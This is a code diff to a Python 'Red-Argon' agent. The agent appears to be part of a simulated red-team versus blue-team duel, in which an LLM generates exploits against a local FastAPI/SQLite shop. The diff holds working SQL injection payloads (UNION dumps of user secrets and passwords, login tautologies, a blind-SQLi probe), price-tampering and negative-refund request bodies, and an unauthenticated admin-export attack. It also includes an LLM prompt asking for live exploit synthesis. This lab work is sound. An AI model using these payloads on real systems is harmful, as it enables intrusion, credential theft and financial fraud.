@@ -1,13 +1,18 @@
 """
-Red Team Autonomous Adversary & Zero-Day Recon Agent
+Red Team Autonomous Adversary & Zero-Day Recon Agent (v4.0 - 5 Vulnerability Levels)
 Powered by Google Gemini 4 Argon (Interactions API with thinking_level='medium')
 
 Capabilities:
 1. Live Target Code & Surface Reconnaissance: Inspects active_target.py to identify which
-   vulnerabilities are still unpatched vs. hardened by Blue-Argon.
+   of the 5 vulnerabilities (Lv.1 ~ Lv.5) are still unpatched vs. hardened by Blue-Argon.
 2. Autonomous 1-by-1 Exploit Synthesis: Calls client.interactions.create(model="gemini-4-argon",
    thinking_level="medium") to think up and craft bespoke polymorphic exploit payloads.
-3. Multi-Vector Attack Arsenal (5 Distinct Exploit Vectors + Autonomous Recon Mode).
+3. Full 5-Vector Attack Arsenal:
+   - Lv.1 (sqli_search): GET /api/search UNION SQL Injection
+   - Lv.2 (auth_bypass): POST /api/login Boolean Tautology Auth Bypass
+   - Lv.3 (price_tampering): POST /api/order Zero-Dollar Catalog Price Tampering
+   - Lv.4 (negative_qty_drain): POST /api/refund Negative Quantity Wallet Credit Drain
+   - Lv.5 (admin_vault_leak): GET /api/admin/export Broken Access Control Master Key Leak
 """
 
 import json
@@ -45,8 +50,8 @@ class RedArgonAgent:
 
     def _inspect_live_target_surface(self) -> Tuple[str, int, str]:
         """
-        Inspects active_target.py to autonomously determine which vulnerability is currently
-        exposed (1-by-1 progression for autonomous Red vs. Blue duel).
+        Inspects active_target.py to autonomously determine which of the 5 vulnerabilities
+        is currently exposed (1-by-1 progression for autonomous Red vs. Blue duel).
         Returns (chosen_scenario, chosen_level, code_excerpt).
         """
         code = ""
@@ -60,23 +65,36 @@ class RedArgonAgent:
         lv1_patched = ("WHERE name " + "LIKE ?") in code
         lv2_patched = ("WHERE username = ? " + "AND password = ?") in code
         lv3_patched = ("Price tampering " + "detected") in code
+        lv4_patched = ("Negative refund quantity " + "blocked") in code
+        lv5_patched = ("Unauthorized admin vault " + "access blocked") in code
 
+        excerpt = code[-3200:] if code else ""
         if not lv1_patched:
-            return ("sqli_search", 1, code[-2500:] if code else "")
+            return ("sqli_search", 1, excerpt)
         elif not lv2_patched:
-            return ("auth_bypass", 2, code[-2500:] if code else "")
+            return ("auth_bypass", 2, excerpt)
         elif not lv3_patched:
-            return ("price_tampering", 3, code[-2500:] if code else "")
+            return ("price_tampering", 3, excerpt)
+        elif not lv4_patched:
+            return ("negative_qty_drain", 4, excerpt)
+        elif not lv5_patched:
+            return ("admin_vault_leak", 5, excerpt)
         else:
-            # All 3 primary endpoints are hardened -> launch advanced polymorphic bypass probe (Lv.4 / Lv.5)
-            choice = random.choice([("negative_qty_drain", 4), ("blind_sqli_probe", 5)])
-            return (choice[0], choice[1], code[-2500:] if code else "")
+            # All 5 endpoints are patched -> re-probe random vector to verify 100% defense
+            choice = random.choice([
+                ("sqli_search", 1),
+                ("auth_bypass", 2),
+                ("price_tampering", 3),
+                ("negative_qty_drain", 4),
+                ("admin_vault_leak", 5),
+            ])
+            return (choice[0], choice[1], excerpt)
 
     def generate_payload(self, scenario: str, level: int = 1) -> Dict[str, Any]:
         """
         Generates a dynamic exploit payload using Gemini 4 Argon Interactions API (thinking_level='medium').
         If scenario == 'autonomous_recon', Red-Argon autonomously inspects the target surface first
-        and chooses the next unpatched vulnerability one-by-one.
+        and chooses the next unpatched vulnerability one-by-one (Lv.1 -> Lv.5).
         """
         auto_discovered = False
         code_excerpt = ""
@@ -86,7 +104,7 @@ class RedArgonAgent:
         elif os.path.exists(TARGET_FILE):
             try:
                 with open(TARGET_FILE, "r", encoding="utf-8") as f:
-                    code_excerpt = f.read()[-2200:]
+                    code_excerpt = f.read()[-3200:]
             except Exception:
                 pass
 
@@ -100,7 +118,7 @@ Inspect the target FastAPI/SQLite source excerpt below and synthesize a live exp
 ```
 
 Output ONLY valid JSON (no markdown fences) with these exact keys:
-- "endpoint": string ("/api/search", "/api/login", or "/api/order")
+- "endpoint": string ("/api/search", "/api/login", "/api/order", "/api/refund", or "/api/admin/export")
 - "method": string ("GET" or "POST")
 - "params": object (if GET) or "body": object (if POST)
 - "description": string (concise explanation of the exploit vector & CWE)
@@ -141,9 +159,9 @@ Output ONLY valid JSON (no markdown fences) with these exact keys:
             except Exception as e:
                 logger.warning(f"Red-Argon live API fallback ({e}); using polymorphic exploit synthesizer.")
 
-        # Polymorphic expert exploit synthesizer (5 distinct vectors + autonomous discovery metadata)
+        # Polymorphic expert exploit synthesizer across all 5 real vulnerability levels
         prefix = "[🧠 Autonomous Recon] " if auto_discovered else ""
-        if scenario == "sqli_search":
+        if scenario == "sqli_search" or level == 1:
             payload_variants = [
                 "' UNION SELECT id, username, secret_flag, role FROM users--",
                 "quantum%' UNION SELECT 99, username, secret_flag, password FROM users WHERE role='admin'--",
@@ -152,14 +170,14 @@ Output ONLY valid JSON (no markdown fences) with these exact keys:
                 "endpoint": "/api/search",
                 "method": "GET",
                 "params": {"q": random.choice(payload_variants)},
-                "description": f"{prefix}Lv.{level} Search UNION SQLi: Exfiltrating 'users.secret_flag' via unparameterized f-string",
+                "description": f"{prefix}Lv.1 Search UNION SQLi: Exfiltrating 'users.secret_flag' via unparameterized f-string",
                 "reasoning": "Detected raw f-string interpolation `LIKE '%{q}%'` in `search_product()`; crafted 4-column UNION SELECT to dump `users` table.",
-                "resolved_scenario": scenario,
-                "resolved_level": level,
+                "resolved_scenario": "sqli_search",
+                "resolved_level": 1,
                 "auto_discovered": auto_discovered,
                 "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
             }
-        elif scenario == "auth_bypass":
+        elif scenario == "auth_bypass" or level == 2:
             bypass_variants = [
                 "admin' OR '1'='1'--",
                 "admin' OR 1=1 LIMIT 1--",
@@ -168,46 +186,46 @@ Output ONLY valid JSON (no markdown fences) with these exact keys:
                 "endpoint": "/api/login",
                 "method": "POST",
                 "body": {"username": random.choice(bypass_variants), "password": "bypassed_by_red_argon"},
-                "description": f"{prefix}Lv.{level} Auth Bypass SQLi: Hijacking admin session via tautology injection in /api/login",
+                "description": f"{prefix}Lv.2 Auth Bypass SQLi: Hijacking admin session via tautology injection in /api/login",
                 "reasoning": "Detected unescaped `WHERE username = '{req.username}'` in `login()`; injected boolean tautology + comment `--` to neutralize password check.",
-                "resolved_scenario": scenario,
-                "resolved_level": level,
+                "resolved_scenario": "auth_bypass",
+                "resolved_level": 2,
                 "auto_discovered": auto_discovered,
                 "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
             }
-        elif scenario == "price_tampering":
+        elif scenario == "price_tampering" or level == 3:
             return {
                 "endpoint": "/api/order",
                 "method": "POST",
                 "body": {"product_id": 1, "quantity": 10, "unit_price": 0},
-                "description": f"{prefix}Lv.{level} Zero-Dollar Price Tampering: Ordering 10x Quantum AI Processors ($15,000 value) for $0",
+                "description": f"{prefix}Lv.3 Zero-Dollar Price Tampering: Ordering 10x Quantum AI Processors ($15,000 value) for $0",
                 "reasoning": "Detected `total_amount = order.quantity * order.unit_price` in `create_order()` without DB catalog lookup; overriding `unit_price=0`.",
-                "resolved_scenario": scenario,
-                "resolved_level": level,
-                "auto_discovered": auto_discovered,
-                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
-            }
-        elif scenario == "negative_qty_drain":
-            return {
-                "endpoint": "/api/order",
-                "method": "POST",
-                "body": {"product_id": 1, "quantity": -50, "unit_price": 1500},
-                "description": f"{prefix}Lv.4 Negative Quantity Credit Drain: Submitting quantity=-50 to generate -$75,000 fraudulent refund balance",
-                "reasoning": "Probing `create_order()` for missing positive integer bounds (`order.quantity <= 0`) to invert order total calculation.",
-                "resolved_scenario": scenario,
+                "resolved_scenario": "price_tampering",
                 "resolved_level": 3,
                 "auto_discovered": auto_discovered,
                 "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
             }
-        else:  # blind_sqli_probe
+        elif scenario == "negative_qty_drain" or level == 4:
             return {
-                "endpoint": "/api/search",
+                "endpoint": "/api/refund",
+                "method": "POST",
+                "body": {"product_id": 1, "quantity": -50, "unit_price": 1500},
+                "description": f"{prefix}Lv.4 Negative Quantity Refund Drain: Submitting quantity=-50 to credit +$75,000 to attacker wallet",
+                "reasoning": "Detected `wallet_credit = abs(req.quantity) * req.unit_price` in `process_refund()` with no `req.quantity <= 0` guard; draining $75,000.",
+                "resolved_scenario": "negative_qty_drain",
+                "resolved_level": 4,
+                "auto_discovered": auto_discovered,
+                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
+            }
+        else:  # admin_vault_leak / blind_sqli_probe (Lv.5)
+            return {
+                "endpoint": "/api/admin/export",
                 "method": "GET",
-                "params": {"q": "' OR (SELECT CASE WHEN (substr(secret_flag,1,4)='FLAG') THEN 1 ELSE 0 END FROM users WHERE username='admin')=1--"},
-                "description": f"{prefix}Lv.5 Boolean-Blind Subquery SQLi Probe against /api/search",
-                "reasoning": "Testing whether Blue-Argon's parameterized query blocks nested boolean-blind subquery extraction.",
-                "resolved_scenario": scenario,
-                "resolved_level": 1,
+                "params": {},
+                "description": f"{prefix}Lv.5 Broken Access Control: Unauthenticated dump of PQC Master Key Vault via /api/admin/export",
+                "reasoning": "Detected missing cryptographic `X-Admin-Token` verification in `export_admin_vault()`; directly exfiltrating PQC master key.",
+                "resolved_scenario": "admin_vault_leak",
+                "resolved_level": 5,
                 "auto_discovered": auto_discovered,
                 "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
             }
